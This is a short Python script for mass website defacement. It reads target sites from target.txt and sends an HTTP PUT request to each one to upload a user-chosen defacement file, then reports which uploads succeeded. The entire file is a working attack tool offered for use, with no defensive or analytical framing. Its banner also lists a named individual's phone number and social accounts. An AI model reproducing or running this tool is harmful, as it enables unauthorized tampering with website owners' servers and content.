#-*- coding: utf-8 -*-
banner = """
echo '''
 _   _   ___  _   _ _____ _   _ 
| \ | | / _ \| | | |_   _| \ | | Author    : Navin Hariharan
|  \| |/ /_\ \ | | | | | |  \| | Github    : navin-hariharan
| . ` ||  _  | | | | | | | . ` | Instagram : navin_hariharan
| |\  || | | \ \_/ /_| |_| |\  | Linkedin  : navin-hariharan
\_| \_/\_| |_/\___/ \___/\_| \_/ Whatsapp  : +917305574234
''' | lolcat
"""
try:
   import requests, os.path, sys, os
   from PIL import Image
   from termcolor import colored
except ImportError:
   os.system("pip2 install requests && pip2 install termcolor")
   os.system("clear;echo PRESS ENTER TO RESTART| lolcat;read ch")
   os.system("clear")
   os.system(banner)
   os.system("python2 main.py")

b = '\033[31m'
h = '\033[32m'
m = '\033[00m'

def loadfile(theactualfile):
   finalfile = ''
   if sys.version_info.major > 2:
      finalfile = input(theactualfile)
   else:
      finalfile = raw_input(theactualfile)
   
   return str(finalfile)

def deface(script,target_file="target.txt"):
   op = open(script,"r").read()
   with open(target_file, "r") as target:
      target = target.readlines()
      s = requests.Session()
      print(colored("uploading file to %d website",'green')%(len(target)))
      for web in target:
         try:
            site = web.strip()
            if site.startswith("http://") is False:
               site = "http://" + site
            req = s.put(site+"/"+script,data=op)
            if req.status_code < 200 or req.status_code >= 250:
               print(m+"["+b+" FAILED!"+m+" ] %s%s%s"%(colored(site,'white','on_red'),colored('/','white','on_red'),colored(script,'white','on_red')))
            else:
               print(m+"["+h+" SUCCESS"+m+" ] %s%s%s"%(colored(site,'yellow'),colored('/','yellow'),colored(script,'yellow')))

         except requests.exceptions.RequestException:
            continue
         except KeyboardInterrupt:
            print; exit()

def main():
   while True:
      try:
         a = loadfile(colored('Enter your script deface name: ', 'red'))
         if not os.path.isfile(a):
            print("file '%s' not found"%(a))
            continue
         else:
            break
      except KeyboardInterrupt:
         print; exit()

   deface(a)

if __name__ == "__main__":
    main()
